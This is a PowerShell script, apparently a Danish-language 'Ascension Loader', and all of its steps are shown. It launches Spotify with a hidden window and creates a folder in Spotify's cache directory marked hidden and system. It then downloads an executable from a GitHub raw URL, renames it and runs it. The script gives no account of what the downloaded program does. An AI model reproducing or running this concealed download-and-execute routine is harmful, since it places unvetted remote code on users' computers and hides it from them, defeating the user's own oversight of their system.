Write-Host "[*] Ascension Loader v3.1 - Fixet navn" -ForegroundColor Cyan

$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
if (-Not (Test-Path $spotifyPath)) {
    Write-Host "[!] Spotify ikke fundet!" -ForegroundColor Red
    pause; exit
}

if (-Not (Get-Process -Name "Spotify" -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Starter Spotify..." -ForegroundColor Yellow
    Start-Process $spotifyPath -WindowStyle Hidden
    Start-Sleep -Seconds 6
}

$loaderDir = "$env:LOCALAPPDATA\Spotify\Users\Cache\Ascension"
New-Item -ItemType Directory -Force -Path $loaderDir | Out-Null
attrib +h +s $loaderDir

$baseUrl = "https://raw.githubusercontent.com/protocolDK/protocolDKloader/main"

Write-Host "[*] Downloader AscensionGUII.exe..." -ForegroundColor Yellow
Invoke-WebRequest -Uri "$baseUrl/files/AscensionGUII.exe" -OutFile "$loaderDir\Ascension.exe"

Write-Host "[+] Downloadet og omdøbt til Ascension.exe" -ForegroundColor Green

Write-Host "[*] Starter Ascension..." -ForegroundColor Cyan
Start-Process "$loaderDir\Ascension.exe"

Write-Host "[+] Ascension burde åbne nu!" -ForegroundColor Green
pause
